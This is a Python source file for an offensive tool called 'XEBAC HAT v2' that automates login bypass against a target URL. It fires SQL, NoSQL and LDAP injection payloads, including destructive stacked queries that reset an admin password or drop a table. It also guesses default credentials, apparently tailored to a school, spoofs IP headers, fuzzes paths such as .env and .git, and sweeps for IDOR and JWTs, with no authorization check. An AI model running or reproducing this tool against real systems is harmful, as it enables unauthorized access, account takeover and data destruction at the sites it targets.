#!/usr/bin/env python3
"""
XEBAC HAT v2 — Advanced Login Bypass + Recon Engine.
Requires: aiohttp rich urllib3
Run: python -X utf8 xebac_v2.py -u <target-url> [--threads N] [--fuzz] [--all]
"""
import argparse
import asyncio
import base64
import hashlib
import json
import random
import re
import ssl
import string
import time
import urllib.parse
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import aiohttp
import urllib3
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import (
    Progress, SpinnerColumn, BarColumn, MofNCompleteColumn,
    TimeElapsedColumn, TextColumn,
)
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OUTPUT_DIR = Path("xebac_advanced_output")

# ═════════════════════════════════════════════════════════════════════════════
# PAYLOAD DATABASES — massively expanded
# ═════════════════════════════════════════════════════════════════════════════

# ─── SQL injection: auth bypass ──────────────────────────────────────────────
SQL_PAYLOADS = [
    # Tautology — classic
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",
    "admin' OR '1'='1'/*",
    "admin\" OR \"1\"=\"1",
    "admin\" OR \"1\"=\"1\"--",
    "admin' OR 1=1--",
    "admin' OR 1=1#",
    "admin' OR 1=1/*",
    "admin') OR ('1'='1",
    "admin') OR ('1'='1'--",
    "admin')) OR (('1'='1",
    "admin\" OR \"\"=\"",
    "admin\" OR \"x\"=\"x",
    # Comment/whitespace tamper
    "admin'/*!50000OR*/'1'='1",
    "admin'/**/OR/**/1=1--",
    "admin'\tOR\t1=1--",
    "admin'\nOR\n1=1--",
    "admin'\rOR\r1=1--",
    "admin'%09OR%091=1--",
    "admin'%20OR%201=1--",
    "admin'+OR+1=1--",
    "admin'--+",
    "admin'#\n",
    # Numeric context
    "1 OR 1=1",
    "1 OR 1=1--",
    "1' OR '1'='1",
    "1 OR TRUE--",
    "1 OR 1 --",
    "0 OR 1=1--",
    "-1 OR 1=1--",
    # Boolean blind
    "admin' AND 1=1--",
    "admin' AND 1=2--",
    "admin' AND '1'='1",
    "admin' AND (SELECT 1)--",
    "admin' AND SUBSTR('a',1,1)='a'--",
    "admin' AND ASCII(SUBSTR('a',1,1))=97--",
    # Time-based blind (MySQL)
    "admin' AND SLEEP(3)--",
    "admin' AND SLEEP(3)#",
    "admin' OR SLEEP(3)--",
    "admin';SELECT SLEEP(3)--",
    "admin' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "admin' AND BENCHMARK(3000000,SHA1('x'))--",
    # Time-based (PostgreSQL)
    "admin' AND pg_sleep(3)--",
    "admin';SELECT pg_sleep(3)--",
    # Time-based (MSSQL)
    "admin';WAITFOR DELAY '0:0:3'--",
    "admin' WAITFOR DELAY '0:0:3'--",
    # Error-based (MySQL)
    "admin' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "admin' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    "admin' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # UNION — vary column counts
    "admin' UNION SELECT 1--",
    "admin' UNION SELECT 1,2--",
    "admin' UNION SELECT 1,2,3--",
    "admin' UNION SELECT 1,2,3,4--",
    "admin' UNION SELECT 1,2,3,4,5--",
    "admin' UNION SELECT 1,2,3,4,5,6--",
    "admin' UNION SELECT 1,2,3,4,5,6,7--",
    "admin' UNION SELECT 1,2,3,4,5,6,7,8--",
    "admin' UNION SELECT 1,2,3,4,5,6,7,8,9--",
    "admin' UNION SELECT NULL--",
    "admin' UNION SELECT NULL,NULL,NULL--",
    "admin' UNION ALL SELECT 1,2,3--",
    # Hex-encoded
    "0x61646d696e' OR '1'='1",
    "admin' OR 0x31=0x31--",
    # Char-encoded
    "admin' OR CHAR(49)=CHAR(49)--",
    "admin' OR CHR(49)=CHR(49)--",
    # Double-encoded
    "admin%2527%20OR%201=1--",
    "admin%27%20OR%201=1--",
    "admin%2527%2520OR%25201=1--",
    # Case-flipped keywords
    "admin' oR '1'='1",
    "admin' Or '1'='1",
    "admin' UNioN SeLeCt 1--",
    # Stacked / batch
    "admin'; UPDATE users SET password='pwn' WHERE username='admin'--",
    "admin'; INSERT INTO users VALUES('x','x')--",
    "admin'; DROP TABLE sessions--",
    # NoSQL (just in case backend mongo)
    "admin' || '1'=='1",
    "admin' || 1==1//",
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    "admin' || this.password.match(/.*/)//",
    # LDAP
    "admin)(&)",
    "admin)(|(password=*))",
    "*)(uid=*))(|(uid=*",
    # XPath
    "admin' or '1'='1",
    "' or 1=1 or ''='",
]

# ─── Logic / credential bypass ──────────────────────────────────────────────
LOGIC_PAYLOADS = [
    # Empty/null
    {"username": "", "password": ""},
    {"username": " ", "password": " "},
    {"username": "null", "password": "null"},
    {"username": "None", "password": "None"},
    {"username": "undefined", "password": "undefined"},
    # Default creds
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "admin123"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "changeme"},
    {"username": "admin", "password": "letmein"},
    {"username": "admin", "password": "qwerty"},
    {"username": "admin", "password": "P@ssw0rd"},
    {"username": "admin", "password": "Admin@123"},
    {"username": "administrator", "password": "administrator"},
    {"username": "administrator", "password": "password"},
    {"username": "root", "password": "root"},
    {"username": "root", "password": "toor"},
    {"username": "test", "password": "test"},
    {"username": "guest", "password": "guest"},
    {"username": "user", "password": "user"},
    {"username": "sa", "password": ""},
    {"username": "sa", "password": "sa"},
    # School-specific
    {"username": "admin", "password": "queen"},
    {"username": "admin", "password": "valley"},
    {"username": "admin", "password": "qvs"},
    {"username": "admin", "password": "school"},
    {"username": "admin", "password": "2024"},
    {"username": "admin", "password": "2023"},
    {"username": "admin", "password": "2025"},
    {"username": "principal", "password": "principal"},
    {"username": "teacher", "password": "teacher"},
    {"username": "staff", "password": "staff"},
    {"username": "office", "password": "office"},
    # Case variants
    {"username": "ADMIN", "password": "ADMIN"},
    {"username": "Admin", "password": "Admin"},
    {"username": "aDmIn", "password": "aDmIn"},
    # Truncated — MySQL 5.x column truncation
    {"username": "admin     ", "password": "x"},
    {"username": "admin\x00", "password": "x"},
    {"username": "admin\r\n", "password": "x"},
    # Unicode normalization
    {"username": "\u0430dmin", "password": "x"},  # cyrillic a
    {"username": "admin\u200b", "password": "x"},  # zero-width
    # Array injection
    {"username[]": "admin", "password[]": "x"},
    {"username": "admin", "password[]": "x"},
    # JSON bypasses (if endpoint accepts JSON)
    {"username": {"$ne": None}, "password": "x"},
    {"username": "admin", "password": {"$ne": None}},
]

# ─── Header manipulation ─────────────────────────────────────────────────────
HEADER_VARIATIONS = [
    {},
    # IP spoofing — very common trust-boundary bug
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "10.10.10.10"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "8.8.8.8"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Real-IP": "10.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    # Path override — can bypass auth proxies
    {"X-Original-URL": "/admin/dashboard"},
    {"X-Rewrite-URL": "/admin/dashboard"},
    {"X-Original-URL": "/admin/"},
    {"X-Override-URL": "/admin/dashboard"},
    {"X-Forwarded-Prefix": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Scheme": "http"},
    # Auth bypass header tricks
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/admin/dashboard"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    # Content-type tricks
    {"Content-Type": "application/json"},
    {"Content-Type": "application/xml"},
    {"Content-Type": "text/xml"},
    {"Content-Type": "multipart/form-data; boundary=x"},
    # Rewrite / proxy headers
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "PUT"},
    {"X-Method-Override": "DELETE"},
]

# ─── Auth / session endpoint probes ──────────────────────────────────────────
LOGIN_PATHS = [
    "admin/login", "admin/login.php", "admin/index.php", "admin/",
    "administrator/", "administrator/index.php", "wp-login.php",
    "wp-admin/", "login", "login.php", "login.html", "signin",
    "signin.php", "auth/login", "api/login", "api/auth/login",
    "api/v1/login", "api/v1/auth", "api/v2/login",
    "user/login", "users/login", "user/signin", "account/login",
    "admin/login.aspx", "admin/login.jsp", "admin/login.do",
    "manage/login", "manager/login", "cpanel", "webadmin/",
    "phpmyadmin/", "phpMyAdmin/", "pma/", "adminer.php",
    "admin/dashboard", "admin/home", "admin/panel",
    "dashboard", "portal", "portal/login",
    "staff/login", "teacher/login", "student/login",
]

# ─── Sensitive paths ─────────────────────────────────────────────────────────
FUZZ_LIST = [
    # Config & secrets
    ".env", ".env.local", ".env.prod", ".env.dev", ".env.backup",
    ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
    ".svn/entries", ".svn/wc.db",
    ".hg/", ".bzr/",
    ".DS_Store", "Thumbs.db",
    "web.config", "config.php", "wp-config.php", "wp-config.bak",
    "database.yml", "config.yml", "config.yaml", "config.json",
    "settings.py", "local_settings.py", "settings.json",
    "package.json", "composer.json", "composer.lock",
    "Gemfile", "Gemfile.lock", "requirements.txt",
    "docker-compose.yml", "Dockerfile", ".dockerignore",
    ".htaccess", ".htpasswd", ".user.ini",
    # Backups & dumps
    "backup.zip", "backup.tar.gz", "backup.tar", "backup.rar",
    "backup.sql", "backup.sql.gz",
    "db.sqlite3", "database.sqlite", "dump.sql",
    "old.zip", "old.tar.gz", "site.zip", "www.zip",
    "admin.zip", "admin.bak", "index.php.bak", "index.php~",
    # Auth / CMS endpoints
    "api/", "api/v1/", "api/v2/", "api/v3/",
    "api/docs", "api/swagger", "api/swagger.json",
    "api/openapi.json", "swagger", "swagger.json",
    "swagger-ui", "swagger-ui/", "swagger-ui.html",
    "openapi.json", "graphql", "graphiql", "graphql/console",
    "xmlrpc.php", "wp-json/", "wp-json/wp/v2/users",
    "wp-cron.php", "wp-links-opml.php",
    "wp-admin/", "wp-admin/admin-ajax.php",
    # Admin discovery
    "admin", "administrator", "panel", "dashboard", "login",
    "manage", "control", "console", "cpanel", "whm",
    "server-status", "server-info", "status",
    # Debug / info
    "phpinfo.php", "info.php", "test.php", "debug.php",
    "console", "actuator", "actuator/health", "actuator/env",
    "actuator/mappings", "actuator/beans",
    # Well-known
    ".well-known/security.txt", ".well-known/change-password",
    "robots.txt", "sitemap.xml", "humans.txt",
    # Old / staging
    "old/", "old-site/", "staging/", "dev/", "test/",
    "backup/", "backups/", "bak/", "tmp/", "temp/",
    # User data
    "users", "users.json", "user/list", "users/list",
    "admin/users", "admin/user", "api/users", "api/user",
]

# ─── Error signatures for SQLi confirmation ─────────────────────────────────
SQL_ERROR_SIGS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.*SQL[\-\s_]?Server",
    r"SQLServer.*Driver",
    r"OLE DB.*SQL Server",
    r"\bSQL Server.*Error",
    r"ODBC SQL Server Driver",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_",
    r"Oracle error",
    r"Oracle.*Driver",
    r"ORA-\d{4,5}",
    r"quoted string not properly terminated",
    r"unclosed quotation mark",
    r"SQL command not properly ended",
    r"Unclosed quotation mark after the character string",
    r"XPATH syntax error",
    r"Unknown column",
    r"Duplicate entry",
    r"You have an error in your SQL syntax",
]

# ─── User agents ────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.4.0",
    "Wget/1.21.4",
]

# ─── Success signals (in redirect target or body) ───────────────────────────
SUCCESS_KEYWORDS = [
    "dashboard", "welcome", "logout", "log out", "sign out",
    "profile", "admin_panel", "admin panel", "control panel",
    "my account", "settings", "session", "home",
]

SUCCESS_LOCATIONS = [
    "dashboard", "admin", "home", "profile", "welcome",
    "panel", "control", "manage",
]


# ═════════════════════════════════════════════════════════════════════════════
# ENGINE
# ═════════════════════════════════════════════════════════════════════════════

class XebacV2:
    def __init__(self, target: str, threads: int = 30):
        self.target = target.rstrip("/")
        # derive base if target is a login URL
        self.base_url = self._derive_base(self.target)
        self.threads = threads
        self.session: Optional[aiohttp.ClientSession] = None
        self.sem = asyncio.Semaphore(threads)
        self.console = Console()

        self.results = {
            "target": self.target,
            "base_url": self.base_url,
            "waf": None,
            "tech": [],
            "sessions": [],
            "login_success": [],
            "sql_findings": [],
            "logic_findings": [],
            "header_findings": [],
            "sensitive_paths": [],
            "idor_findings": [],
            "jwt_findings": [],
        }
        OUTPUT_DIR.mkdir(exist_ok=True)

    @staticmethod
    def _derive_base(url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    async def _init_session(self):
        if self.session:
            return
        connector = aiohttp.TCPConnector(
            limit=self.threads * 2, ttl_dns_cache=300, ssl=False,
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=12, connect=4),
            headers={"User-Agent": random.choice(USER_AGENTS)},
            cookie_jar=aiohttp.CookieJar(unsafe=True),
        )

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None

    # ─── helpers ─────────────────────────────────────────────────────────────
    def _headers(self, extra: dict = None) -> dict:
        h = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        if extra:
            h.update(extra)
        return h

    def _looks_like_success(self, status: int, headers: dict, body: str) -> Tuple[bool, str]:
        loc = (headers.get("Location") or "").lower()
        if status in (301, 302, 303, 307, 308):
            if any(k in loc for k in SUCCESS_LOCATIONS):
                return True, f"redirect→{headers.get('Location')}"
            if "login" in loc or "error" in loc:
                return False, ""
            # unknown redirect — suspicious but not confirmed
            return False, ""
        low = body.lower()
        for kw in SUCCESS_KEYWORDS:
            if kw in low:
                # require another signal — session cookie set, or absence of password field
                if "password" not in low or "name=\"password\"" not in low:
                    return True, f"body→{kw}"
        return False, ""

    def _scan_sql_errors(self, body: str) -> Optional[str]:
        for pat in SQL_ERROR_SIGS:
            if re.search(pat, body, re.IGNORECASE):
                return pat
        return None

    def _detect_waf(self, headers: dict, body: str) -> Optional[str]:
        h = {k.lower(): v.lower() for k, v in headers.items()}
        blob = body.lower()[:5000]
        if "cloudflare" in str(h) or "cf-ray" in h: return "Cloudflare"
        if "akamai" in str(h) or "akamaighost" in h.get("server", ""): return "Akamai"
        if "sucuri" in str(h) or "x-sucuri" in str(h): return "Sucuri"
        if "incapsula" in str(h) or "x-iinfo" in h: return "Imperva/Incapsula"
        if "aws" in h.get("server", "") or "awselb" in h.get("server", ""): return "AWS ELB"
        if "barracuda" in str(h): return "Barracuda"
        if "f5" in h.get("server", "") or "big-ip" in str(h): return "F5 BIG-IP"
        if "mod_security" in blob or "modsecurity" in blob: return "ModSecurity"
        return None

    def _detect_tech(self, body: str, headers: dict) -> List[str]:
        found = set()
        low = body.lower()
        srv = (headers.get("Server") or "").lower()
        powered = (headers.get("X-Powered-By") or "").lower()
        gen = (headers.get("X-Generator") or "").lower()

        sigs = [
            ("wp-content", "WordPress"), ("wp-includes", "WordPress"),
            ("/wp-json/", "WordPress"),
            ("sites/default/files", "Drupal"),
            ("/components/com_", "Joomla"), ("joomla!", "Joomla"),
            ("laravel_session", "Laravel"),
            ("csrftoken", "Django"),
            ("__admin__", "Django"),
            ("__viewstate", "ASP.NET"), ("asp.net", "ASP.NET"),
            ("react", "React"), ("vue", "Vue"), ("angular", "Angular"),
            ("__next_data__", "Next.js"), ("__nuxt__", "Nuxt"),
            ("jquery", "jQuery"), ("bootstrap", "Bootstrap"),
            ("tailwind", "Tailwind"),
        ]
        for sig, name in sigs:
            if sig in low and name not in found:
                found.add(name)
        for srv_kw, name in [
            ("nginx", "Nginx"), ("apache", "Apache"),
            ("iis", "IIS"), ("openresty", "OpenResty"),
            ("express", "Express"), ("kestrel", "Kestrel"),
        ]:
            if srv_kw in srv:
                found.add(name)
        for p_kw, name in [("php", "PHP"), ("express", "Express"),
                           ("asp.net", "ASP.NET"), ("next.js", "Next.js")]:
            if p_kw in powered:
                found.add(name)
        if "wordpress" in gen: found.add("WordPress")
        return sorted(found)

    # ─── recon ───────────────────────────────────────────────────────────────
    async def recon(self):
        self.console.print(Panel("[bold red]XEBAC HAT v2[/] | Reconnaissance Phase", style="blue"))
        try:
            async with self.session.get(self.target, ssl=False) as resp:
                body = await resp.text(errors="ignore")
                self.results["waf"] = self._detect_waf(dict(resp.headers), body)
                self.results["tech"] = self._detect_tech(body, dict(resp.headers))
                if self.results["waf"]:
                    self.console.print(f"[yellow]WAF:[/] {self.results['waf']}")
                if self.results["tech"]:
                    self.console.print(f"[cyan]Tech:[/] {', '.join(self.results['tech'])}")
        except Exception as e:
            self.console.print(f"[red]recon failed: {e}[/]")

    # ─── login form / CSRF token harvesting ─────────────────────────────────
    async def harvest_form(self) -> Optional[dict]:
        """Pull hidden inputs (CSRF tokens) from the login form."""
        try:
            async with self.session.get(self.target, ssl=False) as resp:
                body = await resp.text(errors="ignore")
        except Exception:
            return None
        # crude HTML form scrape — hidden inputs only
        fields = {}
        for match in re.finditer(
            r'<input[^>]+type=["\']?hidden["\']?[^>]*>', body, re.IGNORECASE
        ):
            tag = match.group(0)
            n = re.search(r'name=["\']([^"\']+)', tag, re.IGNORECASE)
            v = re.search(r'value=["\']([^"\']*)', tag, re.IGNORECASE)
            if n:
                fields[n.group(1)] = v.group(1) if v else ""
        # also detect form action
        action = None
        m = re.search(r'<form[^>]+action=["\']([^"\']+)', body, re.IGNORECASE)
        if m:
            action = urllib.parse.urljoin(self.target, m.group(1))
        if fields or action:
            self.console.print(
                f"[cyan]Form:[/] action={action or '(default)'} "
                f"hidden={list(fields.keys())}"
            )
        return {"action": action or self.target, "fields": fields}

    # ─── SQL injection ───────────────────────────────────────────────────────
    async def try_sql(self, form: dict, progress: Progress, task_id):
        action = form["action"]
        csrf_fields = form["fields"]
        for payload in SQL_PAYLOADS:
            data = dict(csrf_fields)
            data["username"] = payload
            data["password"] = "x"
            data["email"] = payload

            async with self.sem:
                try:
                    async with self.session.post(
                        action, data=data, headers=self._headers(
                            {"Content-Type": "application/x-www-form-urlencoded"}
                        ), ssl=False, allow_redirects=False
                    ) as resp:
                        body = await resp.text(errors="ignore")
                except Exception:
                    progress.update(task_id, advance=1)
                    continue

            ok, why = self._looks_like_success(resp.status, dict(resp.headers), body)
            err = self._scan_sql_errors(body)

            if ok:
                rec = {"payload": payload, "status": resp.status,
                       "reason": why, "location": resp.headers.get("Location")}
                self.results["sql_findings"].append(rec)
                self.results["login_success"].append({"type": "SQL", **rec})
                self.console.print(
                    f"[green]✓ SQL BYPASS:[/] {payload[:60]} → {why}"
                )
                progress.update(task_id, advance=len(SQL_PAYLOADS))
                return
            if err:
                rec = {"payload": payload, "status": resp.status, "error": err}
                self.results["sql_findings"].append(rec)
                self.console.print(
                    f"[yellow]⚠ SQL ERROR:[/] {payload[:60]} → {err}"
                )

            progress.update(task_id, advance=1)

    # ─── logic bypass ────────────────────────────────────────────────────────
    async def try_logic(self, form: dict, progress: Progress, task_id):
        action = form["action"]
        csrf_fields = form["fields"]
        for payload in LOGIC_PAYLOADS:
            data = dict(csrf_fields)
            data.update(payload)

            async with self.sem:
                try:
                    async with self.session.post(
                        action, data=data, headers=self._headers(
                            {"Content-Type": "application/x-www-form-urlencoded"}
                        ), ssl=False, allow_redirects=False
                    ) as resp:
                        body = await resp.text(errors="ignore")
                except Exception:
                    progress.update(task_id, advance=1)
                    continue

            ok, why = self._looks_like_success(resp.status, dict(resp.headers), body)
            if ok:
                rec = {"creds": payload, "status": resp.status, "reason": why,
                       "location": resp.headers.get("Location")}
                self.results["logic_findings"].append(rec)
                self.results["login_success"].append({"type": "LOGIC", **rec})
                self.console.print(
                    f"[green]✓ LOGIC BYPASS:[/] {payload.get('username')} : {payload.get('password')} → {why}"
                )
                progress.update(task_id, advance=len(LOGIC_PAYLOADS))
                return
            progress.update(task_id, advance=1)

    # ─── header bypass ───────────────────────────────────────────────────────
    async def try_headers(self, form: dict, progress: Progress, task_id):
        action = form["action"]
        csrf_fields = form["fields"]
        for headers in HEADER_VARIATIONS:
            data = dict(csrf_fields)
            data["username"] = "admin"
            data["password"] = "definitely_wrong"

            merged = self._headers(headers)
            async with self.sem:
                try:
                    async with self.session.post(
                        action, data=data, headers=merged,
                        ssl=False, allow_redirects=False
                    ) as resp:
                        body = await resp.text(errors="ignore")
                except Exception:
                    progress.update(task_id, advance=1)
                    continue

            ok, why = self._looks_like_success(resp.status, dict(resp.headers), body)
            if ok:
                rec = {"headers": headers, "status": resp.status, "reason": why}
                self.results["header_findings"].append(rec)
                self.results["login_success"].append({"type": "HEADER", **rec})
                self.console.print(f"[green]✓ HEADER BYPASS:[/] {headers} → {why}")
                progress.update(task_id, advance=len(HEADER_VARIATIONS))
                return
            progress.update(task_id, advance=1)

    # ─── fuzz paths ──────────────────────────────────────────────────────────
    async def try_fuzz(self, progress: Progress, task_id):
        async def one(path):
            url = f"{self.base_url}/{path.lstrip('/')}"
            async with self.sem:
                try:
                    async with self.session.get(url, ssl=False, allow_redirects=False) as resp:
                        body = await resp.read()
                        status = resp.status
                        ctype = resp.headers.get("Content-Type", "")
                        size = len(body)
                except Exception:
                    return None
            if status == 200:
                txt = body[:5000].decode("utf-8", errors="ignore").lower()
                if "404" in txt and "not found" in txt:
                    return None
            if status < 400 or status in (401, 403):
                return {"path": path, "status": status,
                        "size": size, "type": ctype,
                        "tech": self._detect_tech(
                            body[:5000].decode("utf-8", errors="ignore"), {}
                        )}
            return None

        # batch of 20 at a time
        chunk_size = 20
        for i in range(0, len(FUZZ_LIST), chunk_size):
            chunk = FUZZ_LIST[i:i + chunk_size]
            results = await asyncio.gather(*[one(p) for p in chunk])
            for r in results:
                if not r:
                    continue
                self.results["sensitive_paths"].append(r)
                color = "green" if r["status"] in (200, 401, 403) else "yellow"
                self.console.print(
                    f"[{color}]⚠ {r['status']}[/] /{r['path']} ({r['size']}B)"
                )
            progress.update(task_id, advance=len(chunk))

    # ─── IDOR sweep ──────────────────────────────────────────────────────────
    async def try_idor(self, progress: Progress, task_id):
        """Try likely IDOR routes — /admin/user/{id}, /api/user/{id}, etc."""
        bases = ["admin/user/", "admin/users/", "api/user/",
                 "api/users/", "user/", "users/", "profile/", "account/"]
        ids = ["1", "2", "3", "admin", "root", "0", "-1", "me"]
        total = len(bases) * len(ids)
        for b in bases:
            for i in ids:
                url = f"{self.base_url}/{b}{i}"
                async with self.sem:
                    try:
                        async with self.session.get(
                            url, ssl=False, allow_redirects=False
                        ) as resp:
                            status = resp.status
                            body = await resp.read()
                    except Exception:
                        progress.update(task_id, advance=1)
                        continue
                if status == 200 and len(body) > 200:
                    txt = body[:5000].decode("utf-8", errors="ignore")
                    # heuristic: JSON with a username/email field
                    if any(k in txt.lower() for k in
                           ('"email"', '"username"', '"password"', '"user_id"')):
                        self.results["idor_findings"].append({
                            "url": url, "status": status, "size": len(body),
                        })
                        self.console.print(f"[green]✓ IDOR[/] {url} ({len(body)}B)")
                progress.update(task_id, advance=1)

    # ─── JWT sniff ───────────────────────────────────────────────────────────
    async def try_jwt(self, progress: Progress, task_id):
        """Look for JWTs in cookies or response bodies; decode & report claims."""
        import re as _re
        jwt_re = _re.compile(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')
        for path in ["", "admin", "login", "dashboard"]:
            url = f"{self.base_url}/{path}".rstrip("/")
            async with self.sem:
                try:
                    async with self.session.get(url, ssl=False) as resp:
                        body = await resp.text(errors="ignore")
                except Exception:
                    progress.update(task_id, advance=1)
                    continue
            tokens = set(jwt_re.findall(body))
            for tok in tokens:
                try:
                    header_b64, payload_b64, _ = tok.split(".")
                    pad = lambda s: s + "=" * (-len(s) % 4)
                    header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
                    payload = json.loads(base64.urlsafe_b64decode(pad(payload_b64)))
                    self.results["jwt_findings"].append({
                        "url": url, "header": header, "payload": payload,
                    })
                    self.console.print(
                        f"[green]✓ JWT[/] {url} alg={header.get('alg')} "
                        f"claims={list(payload.keys())}"
                    )
                except Exception:
                    continue
            progress.update(task_id, advance=1)

    # ─── driver ──────────────────────────────────────────────────────────────
    async def run(self, do_fuzz=True, do_idor=True):
        await self._init_session()
        self.console.print(Panel(
            f"[bold red]XEBAC HAT v2[/]\n"
            f"Target: [cyan]{self.target}[/]\n"
            f"Threads: [cyan]{self.threads}[/]",
            subtitle="Advanced Bypass + Recon Engine", style="blue",
        ))
        try:
            await self.recon()
            form = await self.harvest_form() or {"action": self.target, "fields": {}}

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=40),
                MofNCompleteColumn(),
                TimeElapsedColumn(),
                console=self.console,
            ) as progress:
                t = progress.add_task("SQL Injection...", total=len(SQL_PAYLOADS))
                await self.try_sql(form, progress, t)
                t = progress.add_task("Logic Bypass...", total=len(LOGIC_PAYLOADS))
                await self.try_logic(form, progress, t)
                t = progress.add_task("Header Manipulation...", total=len(HEADER_VARIATIONS))
                await self.try_headers(form, progress, t)

                if do_fuzz:
                    t = progress.add_task("Sensitive Paths...", total=len(FUZZ_LIST))
                    await self.try_fuzz(progress, t)
                if do_idor:
                    t = progress.add_task("IDOR Sweep...",
                                          total=8 * 8)
                    await self.try_idor(progress, t)

                t = progress.add_task("JWT Sniff...", total=4)
                await self.try_jwt(progress, t)
        finally:
            await self.close()
        self._report()

    def _report(self):
        report_path = OUTPUT_DIR / "xebac_v2_report.json"
        report_path.write_text(json.dumps(self.results, indent=2, default=str),
                               encoding="utf-8")

        t = Table(title="XEBAC HAT v2 | Summary")
        t.add_column("Type", style="cyan")
        t.add_column("Detail", style="green")
        t.add_column("Status", style="yellow")

        if self.results["waf"]:
            t.add_row("WAF", self.results["waf"], "detected")
        for x in self.results["tech"]:
            t.add_row("TECH", x, "")
        for x in self.results["sql_findings"]:
            t.add_row("SQL", x.get("payload", "")[:60],
                      x.get("reason") or x.get("error", ""))
        for x in self.results["logic_findings"]:
            t.add_row("LOGIC", str(x.get("creds", ""))[:60], x.get("reason", ""))
        for x in self.results["header_findings"]:
            t.add_row("HEADER", str(x.get("headers", ""))[:60], x.get("reason", ""))
        for x in self.results["sensitive_paths"]:
            t.add_row("PATH", f"/{x['path']}", str(x["status"]))
        for x in self.results["idor_findings"]:
            t.add_row("IDOR", x["url"], str(x["status"]))
        for x in self.results["jwt_findings"]:
            t.add_row("JWT", x["url"], str(x["header"].get("alg")))

        self.console.print(t)
        self.console.print(f"\n[bold]Report →[/] {report_path}")


# ═════════════════════════════════════════════════════════════════════════════
# CLI
# ═════════════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(prog="xebac_v2.py")
    ap.add_argument("-u", "--url", required=True,
                    help="Target login URL, e.g. https://site.com/admin/login")
    ap.add_argument("-t", "--threads", type=int, default=30)
    ap.add_argument("--no-fuzz", action="store_true")
    ap.add_argument("--no-idor", action="store_true")
    args = ap.parse_args()

    engine = XebacV2(args.url, threads=args.threads)
    asyncio.run(engine.run(do_fuzz=not args.no_fuzz, do_idor=not args.no_idor))


if __name__ == "__main__":
    main()